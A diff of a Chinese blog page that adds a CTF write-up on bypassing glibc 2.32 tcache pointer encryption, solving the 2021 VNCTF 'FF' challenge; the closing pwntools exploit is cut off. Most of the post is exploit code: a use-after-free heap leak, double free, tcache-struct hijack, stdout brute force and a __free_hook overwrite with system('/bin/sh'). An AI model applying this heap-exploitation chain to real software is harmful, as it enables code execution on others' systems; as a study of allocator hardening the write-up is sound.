@@ -6,17 +6,35 @@
   <meta name="renderer" content="webkit">
   <meta http-equiv="X-UA-Compatible" content="IE=edge" >
   <link rel="dns-prefetch" href="http://example.com">
-  <title>Tag: HTML | 大能猫的博客</title>
+  <title>glibc2.32的一些那啥 | 大能猫的博客</title>
   <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
-  <meta name="description" content="一只喜欢呜呜呜的猫">
-<meta property="og:type" content="website">
-<meta property="og:title" content="大能猫的博客">
-<meta property="og:url" content="http://example.com/tags/HTML/index.html">
+  <meta name="description" content="前言姑且把这篇文章看作对这周做题的一个总结吧，本人的之后还仅限于glibc2.31以及之前的版本，对glibc2.32以及之后的版本了解的少之又少，这周做题遇到了问题也不能及时的解决，所以我还是了解一下吧。 这里们用到的环境都是glibc2.33，从2.32到2.33之间，堆管理系统下的保护斌没有太大的变化，所以我们就直接使用glibc2.33的环境进行测试。  指针异或加密保护在2.32及其之后">
+<meta property="og:type" content="article">
+<meta property="og:title" content="glibc2.32的一些那啥">
+<meta property="og:url" content="http://example.com/2022/01/23/glibc2.32/index.html">
 <meta property="og:site_name" content="大能猫的博客">
-<meta property="og:description" content="一只喜欢呜呜呜的猫">
+<meta property="og:description" content="前言姑且把这篇文章看作对这周做题的一个总结吧，本人的之后还仅限于glibc2.31以及之前的版本，对glibc2.32以及之后的版本了解的少之又少，这周做题遇到了问题也不能及时的解决，所以我还是了解一下吧。 这里们用到的环境都是glibc2.33，从2.32到2.33之间，堆管理系统下的保护斌没有太大的变化，所以我们就直接使用glibc2.33的环境进行测试。  指针异或加密保护在2.32及其之后">
 <meta property="og:locale" content="en_US">
+<meta property="og:image" content="https://assets.b3logfile.com/siyuan/1637149294294/assets/image-20220514122813-urxs11s.png">
+<meta property="og:image" content="https://assets.b3logfile.com/siyuan/1637149294294/assets/image-20220514141642-4rxs42m.png">
+<meta property="og:image" content="https://assets.b3logfile.com/siyuan/1637149294294/assets/image-20220514141612-5botobc.png">
+<meta property="og:image" content="https://assets.b3logfile.com/siyuan/1637149294294/assets/image-20220514143406-gedredv.png">
+<meta property="og:image" content="https://assets.b3logfile.com/siyuan/1637149294294/assets/image-20220514144207-tmjhpqi.png">
+<meta property="og:image" content="https://assets.b3logfile.com/siyuan/1637149294294/assets/image-20220514144757-n8ne7i3.png">
+<meta property="og:image" content="https://assets.b3logfile.com/siyuan/1637149294294/assets/image-20220514145113-te5x47w.png">
+<meta property="og:image" content="https://assets.b3logfile.com/siyuan/1637149294294/assets/image-20220514153151-zgkvxd5.png">
+<meta property="og:image" content="https://assets.b3logfile.com/siyuan/1637149294294/assets/image-20220514153416-8c7x5sr.png">
+<meta property="og:image" content="https://assets.b3logfile.com/siyuan/1637149294294/assets/image-20220514163952-96h7euy.png">
+<meta property="og:image" content="https://assets.b3logfile.com/siyuan/1637149294294/assets/LKZZKXBF3T4Q_N_JT-20220514163711-41fbhgx.png">
+<meta property="og:image" content="https://assets.b3logfile.com/siyuan/1637149294294/assets/image-20220514164328-i07ole3.png">
+<meta property="og:image" content="https://assets.b3logfile.com/siyuan/1637149294294/assets/image-20220514164530-muhumne.png">
+<meta property="article:published_time" content="2022-01-23T13:07:15.000Z">
+<meta property="article:modified_time" content="2022-11-05T12:53:45.985Z">
 <meta property="article:author" content="大能猫">
+<meta property="article:tag" content="pwn">
+<meta property="article:tag" content="heap">
 <meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://assets.b3logfile.com/siyuan/1637149294294/assets/image-20220514122813-urxs11s.png">
   
     <link rel="alternative" href="/atom.xml" title="大能猫的博客" type="application/atom+xml">
   
@@ -156,79 +174,264 @@
             <canvas data-colors="#eaeaea" data-sectionHeight="100" data-contentId="js-content" id="myCanvas1" class="anm-canvas"></canvas>
           </div>
           <div id="js-content" class="content-ll">
-            
-  
-  
+            <article id="post-glibc2.32" class="article article-type-post " itemscope itemprop="blogPost">
+  <div class="article-inner">
     
-    
-      
-      
-      <section class="archives-wrap">
-        <div class="archive-year-wrap">
-          <a href="/archives/2018" class="archive-year">2018</a>
-        </div>
-        <div class="archives">
-    
-    <article class="archive-article archive-type-post">
-  <div class="archive-article-inner">
-    <header class="archive-article-header">
-      	<div class="article-meta">
-	      	<a href="/2018/11/23/html/" class="archive-article-date">
-  	<time datetime="2018-11-23T13:07:15.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2018-11-23</time>
-</a>
-        </div>
-    	 
+      <header class="article-header">
+        
   
-    <h1 itemprop="name">
-      <a class="archive-article-title" href="/2018/11/23/html/">HTML入门笔记</a>
+    <h1 class="article-title" itemprop="name">
+      glibc2.32的一些那啥
     </h1>
   
 
-        <div class="article-info info-on-right">
-          
+        
+        <a href="/2022/01/23/glibc2.32/" class="archive-article-date">
+  	<time datetime="2022-01-23T13:07:15.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2022-01-23</time>
+</a>
+        
+      </header>
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <h3 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h3><p>姑且把这篇文章看作对这周做题的一个总结吧，本人的之后还仅限于glibc2.31以及之前的版本，对glibc2.32以及之后的版本了解的少之又少，这周做题遇到了问题也不能及时的解决，所以我还是了解一下吧。</p>
+<p>这里们用到的环境都是glibc2.33，从2.32到2.33之间，堆管理系统下的保护斌没有太大的变化，所以我们就直接使用glibc2.33的环境进行测试。</p>
+<p><img src="https://assets.b3logfile.com/siyuan/1637149294294/assets/image-20220514122813-urxs11s.png" alt="image.png"></p>
+<h3 id="指针异或加密保护"><a href="#指针异或加密保护" class="headerlink" title="指针异或加密保护"></a>指针异或加密保护</h3><p>在2.32及其之后的版本中进行了一把大改革，就是将我们之前经常利用tcache fd，bk等指针进行了一把异或的加密让我们的利用更难进行，leak之后更难进行一个切片接受，这样几乎就劝退许多比较慵懒的人（比如说我。</p>
+<h4 id="源码对比"><a href="#源码对比" class="headerlink" title="源码对比"></a>源码对比</h4><p>我们先进行一个源码的对比：</p>
+<p>我们主要是分析tcache的存放问题，之分析源码中tcache_put()和tcache_get()函数</p>
+<h5 id="glibc2-31："><a href="#glibc2-31：" class="headerlink" title="glibc2.31："></a>glibc2.31：</h5><p>我们发现在存取两个函数中没有堆指针的合法性做出检测，就是一个比较单纯的链子，也十分的容易欺骗。</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* Caller must ensure that we know tc_idx is valid and there&#x27;s room</span></span><br><span class="line"><span class="comment">   for more chunks.  */</span></span><br><span class="line"><span class="type">static</span> __always_inline <span class="type">void</span></span><br><span class="line"><span class="title function_">tcache_put</span> <span class="params">(mchunkptr chunk, <span class="type">size_t</span> tc_idx)</span></span><br><span class="line">&#123;</span><br><span class="line">  tcache_entry *e = (tcache_entry *) chunk2mem (chunk);</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Mark this chunk as &quot;in the tcache&quot; so the test in _int_free will</span></span><br><span class="line"><span class="comment">     detect a double free.  */</span></span><br><span class="line">  e-&gt;key = tcache;</span><br><span class="line"></span><br><span class="line">  e-&gt;next = tcache-&gt;entries[tc_idx];</span><br><span class="line">  tcache-&gt;entries[tc_idx] = e;</span><br><span class="line">  ++(tcache-&gt;counts[tc_idx]);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* Caller must ensure that we know tc_idx is valid and there&#x27;s</span></span><br><span class="line"><span class="comment">   available chunks to remove.  */</span></span><br><span class="line"><span class="type">static</span> __always_inline <span class="type">void</span> *</span><br><span class="line"><span class="title function_">tcache_get</span> <span class="params">(<span class="type">size_t</span> tc_idx)</span></span><br><span class="line">&#123;</span><br><span class="line">  tcache_entry *e = tcache-&gt;entries[tc_idx];</span><br><span class="line">  tcache-&gt;entries[tc_idx] = e-&gt;next;</span><br><span class="line">  --(tcache-&gt;counts[tc_idx]);</span><br><span class="line">  e-&gt;key = <span class="literal">NULL</span>;</span><br><span class="line">  <span class="keyword">return</span> (<span class="type">void</span> *) e;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<h5 id="glibc2-32"><a href="#glibc2-32" class="headerlink" title="glibc2.32"></a>glibc2.32</h5><p>我们发现相比glibc2.31增加了一个东西——PROTECT_PTR，REVEAL_PTR，通过字面意思我们发现这是一个指针的保护，具体怎么保护我们还是需要分析一下PROTECT_PTR、REVEAL_PTR本身。</p>
+<p>然后就是在我们取出堆块的时候增加了一个保护，就是检测堆块的指针是否合法</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* Caller must ensure that we know tc_idx is valid and there&#x27;s room</span></span><br><span class="line"><span class="comment">   for more chunks.  */</span></span><br><span class="line"><span class="type">static</span> __always_inline <span class="type">void</span></span><br><span class="line"><span class="title function_">tcache_put</span> <span class="params">(mchunkptr chunk, <span class="type">size_t</span> tc_idx)</span></span><br><span class="line">&#123;</span><br><span class="line">  tcache_entry *e = (tcache_entry *) chunk2mem (chunk);</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Mark this chunk as &quot;in the tcache&quot; so the test in _int_free will</span></span><br><span class="line"><span class="comment">     detect a double free.  */</span></span><br><span class="line">  e-&gt;key = tcache;</span><br><span class="line"></span><br><span class="line">  e-&gt;next = PROTECT_PTR (&amp;e-&gt;next, tcache-&gt;entries[tc_idx]);</span><br><span class="line">  tcache-&gt;entries[tc_idx] = e;</span><br><span class="line">  ++(tcache-&gt;counts[tc_idx]);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* Caller must ensure that we know tc_idx is valid and there&#x27;s</span></span><br><span class="line"><span class="comment">   available chunks to remove.  */</span></span><br><span class="line"><span class="type">static</span> __always_inline <span class="type">void</span> *</span><br><span class="line"><span class="title function_">tcache_get</span> <span class="params">(<span class="type">size_t</span> tc_idx)</span></span><br><span class="line">&#123;</span><br><span class="line">  tcache_entry *e = tcache-&gt;entries[tc_idx];</span><br><span class="line">  <span class="keyword">if</span> (__glibc_unlikely (!aligned_OK (e)))</span><br><span class="line">    malloc_printerr (<span class="string">&quot;malloc(): unaligned tcache chunk detected&quot;</span>);</span><br><span class="line">  tcache-&gt;entries[tc_idx] = REVEAL_PTR (e-&gt;next);</span><br><span class="line">  --(tcache-&gt;counts[tc_idx]);</span><br><span class="line">  e-&gt;key = <span class="literal">NULL</span>;</span><br><span class="line">  <span class="keyword">return</span> (<span class="type">void</span> *) e;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>我们来看关键的PROTECT_PTR、REVEAL_PTR：</p>
+<p>这里对堆块的处理是一次异或运算，就是 <strong>tcache_entry-&gt;next</strong>中存放的地址于自身的地址进行一波异或然后得到的值在放入原来的位置。这就需要我们不仅要获得指针，而是要提前获得堆块的及地址。这就给我们利用带来的不小的麻烦。</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> PROTECT_PTR(pos, ptr) \</span></span><br><span class="line"><span class="meta">  ((__typeof (ptr)) ((((size_t) pos) &gt;&gt; 12) ^ ((size_t) ptr)))</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> REVEAL_PTR(ptr)  PROTECT_PTR (&amp;ptr, ptr)</span></span><br></pre></td></tr></table></figure>
+
+<p>大佬的想法：若是我们能够直接控制 <code>tcache struct</code>，则仍然可以直接进行任意地址写，这是因为在 tcache struct 中存放的仍是未经异或运算的原始 chunk 地址。</p>
+<h4 id="绕过方法"><a href="#绕过方法" class="headerlink" title="绕过方法"></a>绕过方法</h4><p>这样的话，我们想到，一个数异或他的本身为0，这几样的话一个数异或0就是他的本身，那么放入第一个他tcache的时候其堆块内就有本身的地址，如果有uaf的话就可以泄露heapbase，正是因为这个机制，为我们提供了一个更加方便的leak_heap的方法。</p>
+<h3 id="题目实践-2021VNCTF-FF"><a href="#题目实践-2021VNCTF-FF" class="headerlink" title="题目实践-2021VNCTF-FF"></a>题目实践-2021VNCTF-FF</h3><h4 id="例行检查"><a href="#例行检查" class="headerlink" title="例行检查"></a>例行检查</h4><p><img src="https://assets.b3logfile.com/siyuan/1637149294294/assets/image-20220514141642-4rxs42m.png" alt="image.png"></p>
+<h4 id="逆向分析"><a href="#逆向分析" class="headerlink" title="逆向分析"></a>逆向分析</h4><p>存在uaf漏洞，只能show一次，edit两次。</p>
+<p><img src="https://assets.b3logfile.com/siyuan/1637149294294/assets/image-20220514141612-5botobc.png" alt="image.png"></p>
+<h5 id="leak-heapbase"><a href="#leak-heapbase" class="headerlink" title="leak_heapbase"></a>leak_heapbase</h5><p>那我们想来了，之前我们分析的漏洞，就是在我们free掉第一个tcache bin堆块之后，fd上就有heap的地址我们先执行</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">def <span class="title function_">pwn</span><span class="params">()</span>:</span><br><span class="line">	<span class="title function_">add</span><span class="params">(<span class="number">0x80</span>,<span class="string">&#x27;powercat&#x27;</span>)</span></span><br><span class="line">	<span class="title function_">delete</span><span class="params">()</span></span><br><span class="line">	gdb.<span class="title function_">attach</span><span class="params">(p)</span></span><br><span class="line">	<span class="title function_">itr</span><span class="params">()</span></span><br></pre></td></tr></table></figure>
+
+<p>我们gdb看一下其中的东西</p>
+<p><img src="https://assets.b3logfile.com/siyuan/1637149294294/assets/image-20220514143406-gedredv.png" alt="image.png"></p>
+<p>我们发现少了下面的三位，不过无伤大雅只要*0x1000就行了。</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">add(<span class="number">0x80</span>,<span class="string">&#x27;powercat&#x27;</span>)</span><br><span class="line">delete()</span><br><span class="line">show()</span><br><span class="line">heap_leak = u64(r(<span class="number">6</span>).ljust(<span class="number">8</span>, b<span class="number">&#x27;</span>\x00<span class="number">&#x27;</span>))</span><br><span class="line">heap_base = heap_leak * <span class="number">0x1000</span></span><br><span class="line">leak(<span class="string">&#x27;heap base: &#x27;</span> + hex(heap_base))</span><br></pre></td></tr></table></figure>
+
+<p>成功泄露</p>
+<p><img src="https://assets.b3logfile.com/siyuan/1637149294294/assets/image-20220514144207-tmjhpqi.png" alt="image.png"></p>
+<h5 id="实现double-free"><a href="#实现double-free" class="headerlink" title="实现double free"></a>实现double free</h5><p>这里我们只需要进行将key修改了就可以实现double free</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">edit(<span class="string">&#x27;powercat&#x27;</span>)</span><br></pre></td></tr></table></figure>
+
+<p>修改后</p>
+<p><img src="https://assets.b3logfile.com/siyuan/1637149294294/assets/image-20220514144757-n8ne7i3.png" alt="image.png"></p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">delete()</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://assets.b3logfile.com/siyuan/1637149294294/assets/image-20220514145113-te5x47w.png" alt="image.png"></p>
+<p>实现了double free。</p>
+<h5 id="free掉tcache-struct"><a href="#free掉tcache-struct" class="headerlink" title="free掉tcache struct"></a>free掉tcache struct</h5><p>我们只需要修改一下tcache的内容就可以，我们知道前面的一些机制我们就可以相应的取修改一下这个指针</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">edit1(p64(heap_leak^(heap_base+<span class="number">0x10</span>)))</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://assets.b3logfile.com/siyuan/1637149294294/assets/image-20220514153151-zgkvxd5.png" alt="image.png"></p>
+<p>成功将tcache_struct链入bin中。</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">tcache_struct = heap_base + <span class="number">0x10</span></span><br><span class="line">pl = heap_leak ^ tcache_struct</span><br><span class="line">print(pl)</span><br><span class="line">edit1(p64(pl))</span><br><span class="line">add(<span class="number">0x80</span>, <span class="string">&#x27;powercat&#x27;</span>)</span><br><span class="line">add(<span class="number">0x80</span>, <span class="string">&#x27;\x00\x00&#x27;</span> * (<span class="number">0xe</span> + <span class="number">0x10</span> + <span class="number">9</span>) + <span class="string">&#x27;\x07\x00&#x27;</span>)</span><br><span class="line">delete()</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://assets.b3logfile.com/siyuan/1637149294294/assets/image-20220514153416-8c7x5sr.png" alt="image.png"></p>
+<p>这里已经成功将tcache_struct free掉</p>
+<h5 id="将stdout放入tcache-struct"><a href="#将stdout放入tcache-struct" class="headerlink" title="将stdout放入tcache_struct"></a>将stdout放入tcache_struct</h5><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">add(<span class="number">0x40</span>, (<span class="string">&#x27;\x00\x00&#x27;</span> * <span class="number">3</span> + <span class="string">&#x27;\x01\x00&#x27;</span> + <span class="string">&#x27;\x00\x00&#x27;</span> * <span class="number">2</span> + <span class="string">&#x27;\x01\x00&#x27;</span>).ljust(<span class="number">0x70</span>, <span class="string">&#x27;\x00&#x27;</span>))</span><br><span class="line">add(<span class="number">0x30</span>, <span class="string">&#x27;\x00&#x27;</span>.ljust(<span class="number">0x30</span>, <span class="string">&#x27;\x00&#x27;</span>))</span><br><span class="line">add1(<span class="number">0x10</span>, p64(<span class="number">0</span>) + p16(<span class="number">0x66c0</span>))</span><br><span class="line">add1(<span class="number">0x40</span>, p64(<span class="number">0xfbad1800</span>) + p64(<span class="number">0</span>) * <span class="number">3</span> + b<span class="number">&#x27;</span>\x00<span class="number">&#x27;</span>)</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://assets.b3logfile.com/siyuan/1637149294294/assets/image-20220514163952-96h7euy.png" alt="image.png"></p>
+<p>这里需要我们进行爆破</p>
+<p>这里我们爆破到了stdout leak到了libc</p>
+<p><img src="https://assets.b3logfile.com/siyuan/1637149294294/assets/LKZZKXBF3T4Q_N_JT-20220514163711-41fbhgx.png" alt="LKZZKXBF3T4Q_N_JT.png"></p>
+<h5 id="leak-libc"><a href="#leak-libc" class="headerlink" title="leak_libc"></a>leak_libc</h5><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">libcbase = uu64(ru(b<span class="number">&#x27;</span>\x7f<span class="number">&#x27;</span>)[<span class="number">-5</span>:]+b<span class="number">&#x27;</span>\x7f<span class="number">&#x27;</span>) - <span class="number">0x1e4744</span></span><br></pre></td></tr></table></figure>
+
+<p><img src="https://assets.b3logfile.com/siyuan/1637149294294/assets/image-20220514164328-i07ole3.png" alt="image.png"></p>
+<p><img src="https://assets.b3logfile.com/siyuan/1637149294294/assets/image-20220514164530-muhumne.png" alt="image.png"></p>
+<h5 id="劫持-free-hook"><a href="#劫持-free-hook" class="headerlink" title="劫持__free_hook"></a>劫持__free_hook</h5><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">add1(<span class="number">0x10</span>, p64(libcbase + libc.sym[<span class="string">&#x27;__free_hook&#x27;</span>]<span class="number">-0x20</span>))</span><br><span class="line">add1(<span class="number">0x70</span>, p64(libcbase + libc.sym[<span class="string">&#x27;system&#x27;</span>]))</span><br><span class="line">add1(<span class="number">0x10</span>, b<span class="number">&#x27;</span>/bin/sh\x00<span class="number">&#x27;</span>)</span><br></pre></td></tr></table></figure>
+
+<p>okk</p>
+<h5 id="触发"><a href="#触发" class="headerlink" title="触发"></a>触发</h5><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">delete()</span><br></pre></td></tr></table></figure>
+
+<p>好！</p>
+<h4 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#encoding = utf-8</span></span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="comment">#from LibcSearcher import * </span></span><br><span class="line"></span><br><span class="line">context.log_level = <span class="string">&quot;debug&quot;</span></span><br><span class="line">context.os = <span class="string">&#x27;linux&#x27;</span></span><br><span class="line">context.arch = <span class="string">&#x27;amd64&#x27;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">s       = <span class="keyword">lambda</span> data               :p.send(<span class="built_in">str</span>(data))</span><br><span class="line">sa      = <span class="keyword">lambda</span> delim,data         :p.sendafter(<span class="built_in">str</span>(delim), <span class="built_in">str</span>(data))</span><br><span class="line">sl      = <span class="keyword">lambda</span> data               :p.sendline(<span class="built_in">str</span>(data))</span><br><span class="line">sla     = <span class="keyword">lambda</span> delim,data         :p.sendlineafter(<span class="built_in">str</span>(delim), <span class="built_in">str</span>(data))</span><br><span class="line">r       = <span class="keyword">lambda</span> num                :p.recv(num)</span><br><span class="line">ru      = <span class="keyword">lambda</span> delims, drop=<span class="literal">True</span>  :p.recvuntil(delims, drop)</span><br><span class="line">itr     = <span class="keyword">lambda</span>                    :p.interactive()</span><br><span class="line">uu32    = <span class="keyword">lambda</span> data               :u32(data.ljust(<span class="number">4</span>,<span class="string">&#x27;\x00&#x27;</span>))</span><br><span class="line">uu64    = <span class="keyword">lambda</span> data               :u64(data.ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">leak    = <span class="keyword">lambda</span> name,addr          :log.success(<span class="string">&#x27;&#123;&#125; = &#123;:#x&#125;&#x27;</span>.<span class="built_in">format</span>(name, addr))</span><br><span class="line"></span><br><span class="line">p = process(<span class="string">&quot;./pwn&quot;</span>)</span><br><span class="line">elf = ELF(<span class="string">&quot;./pwn&quot;</span>)</span><br><span class="line">libc = ELF(<span class="string">&quot;./libc.so.6&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">choice</span>(<span class="params">cho</span>):</span><br><span class="line">	sla(<span class="string">&quot;&gt;&gt;&quot;</span>,cho)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>(<span class="params">size,content</span>):</span><br><span class="line">	choice(<span class="number">1</span>)</span><br><span class="line">	sla(<span class="string">&#x27;Size:&#x27;</span>,size)</span><br><span class="line">	sla(<span class="string">&#x27;Content:&#x27;</span>,content)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add1</span>(<span class="params">size,content</span>):</span><br><span class="line">	choice(<span class="number">1</span>)</span><br><span class="line">	sla(<span class="string">&#x27;Size:&#x27;</span>,size)</span><br><span class="line">	p.sendafter(<span class="string">&#x27;Content:&#x27;</span>,content)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">delete</span>():</span><br><span class="line">	choice(<span class="number">2</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">show</span>():</span><br><span class="line">	choice(<span class="number">3</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">edit</span>(<span class="params">content</span>):</span><br><span class="line">	choice(<span class="number">5</span>)</span><br><span class="line">	sla(<span class="string">&#x27;Content:&#x27;</span>,content)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">edit1</span>(<span class="params">content</span>):</span><br><span class="line">	choice(<span class="number">5</span>)</span><br><span class="line">	p.sendafter(<span class="string">&#x27;Content:&#x27;</span>,content)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">pwn</span>():</span><br><span class="line">	<span class="comment">#gdb.attach(p)</span></span><br><span class="line">	add(<span class="number">0x80</span>,<span class="string">&#x27;powercat&#x27;</span>)</span><br><span class="line">	delete()</span><br><span class="line">	show()</span><br><span class="line">	heap_leak = u64(r(<span class="number">6</span>).ljust(<span class="number">8</span>, <span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">	heap_base = heap_leak * <span class="number">0x1000</span></span><br><span class="line">	leak(<span class="string">&#x27;heap base: &#x27;</span>,heap_base)</span><br><span class="line">	edit(<span class="string">&#x27;powercat&#x27;</span>)</span><br><span class="line">	delete()</span><br><span class="line">	tcache_struct = heap_base + <span class="number">0x10</span></span><br><span class="line">	pl = heap_leak ^ tcache_struct</span><br><span class="line">	<span class="built_in">print</span>(pl)</span><br><span class="line">	edit1(p64(pl))</span><br><span class="line">	add(<span class="number">0x80</span>, <span class="string">&#x27;powercat&#x27;</span>)</span><br><span class="line">	add(<span class="number">0x80</span>, <span class="string">&#x27;\x00\x00&#x27;</span> * (<span class="number">0xe</span> + <span class="number">0x10</span> + <span class="number">9</span>) + <span class="string">&#x27;\x07\x00&#x27;</span>)</span><br><span class="line">	delete()</span><br><span class="line">	add(<span class="number">0x40</span>, (<span class="string">&#x27;\x00\x00&#x27;</span> * <span class="number">3</span> + <span class="string">&#x27;\x01\x00&#x27;</span> + <span class="string">&#x27;\x00\x00&#x27;</span> * <span class="number">2</span> + <span class="string">&#x27;\x01\x00&#x27;</span>).ljust(<span class="number">0x70</span>, <span class="string">&#x27;\x00&#x27;</span>))</span><br><span class="line">	add(<span class="number">0x30</span>, <span class="string">&#x27;\x00&#x27;</span>.ljust(<span class="number">0x30</span>, <span class="string">&#x27;\x00&#x27;</span>))</span><br><span class="line">	add1(<span class="number">0x10</span>, p64(<span class="number">0</span>) + p16(<span class="number">0x66c0</span>))</span><br><span class="line">	add1(<span class="number">0x40</span>, p64(<span 